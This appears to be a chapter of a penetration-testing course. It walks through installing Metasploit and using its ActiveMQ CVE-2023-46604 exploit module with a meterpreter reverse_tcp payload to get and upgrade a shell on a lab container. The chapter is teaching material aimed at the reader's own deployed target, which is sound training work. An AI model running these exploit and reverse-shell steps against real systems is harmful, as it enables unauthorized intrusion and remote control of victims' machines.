# Gaining access

Delivering and executing a malicious payload against the target.

- For a relatively new exploit, custom scripting is needed.
- After an exploit becomes widely known, automation PoCs are developed by the communitity and usually found on GitHub.

## Practice

[Metasploit framework](https://github.com/rapid7/metasploit-framework) is the most popular exploitation framework with a large collection of community-developed payloads and exploits.

1. Install metasploit framework

   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
   chmod 755 msfinstall && \
   ./msfinstall
   ```

1. Launch the main console (answer `yes` to initialize a new db when asked).

   ```bash
   msfconsole
   ```

1. Search and use a relenvant module

   ```bash
   search activemq
   use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
   ```

1. Choose target platform

   ```shell
   show targets
   set target 1
   ```

1. Choose a supported payload (meterpreter is an attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code)

   ```bash
   show payloads
   set payload cmd/linux/http/x86/meterpreter/reverse_tcp
   ```

1. Configure module options

   ```shell
   show options
   set rhosts vuln
   set srvport 5555
   ```

1. Launch the exploit to gain a shell

   ```bash
   run
   ```

1. In meterpreter, use `help` to see the list of available commands. To drop into a shell, simply run:

   ```bash
   shell
   ```

1. [Upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell (also check [pwncat](https://github.com/cytopia/pwncat))

   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

## Exercise 4

Perform similar steps to exploit the container you deployed in the previous exercise.
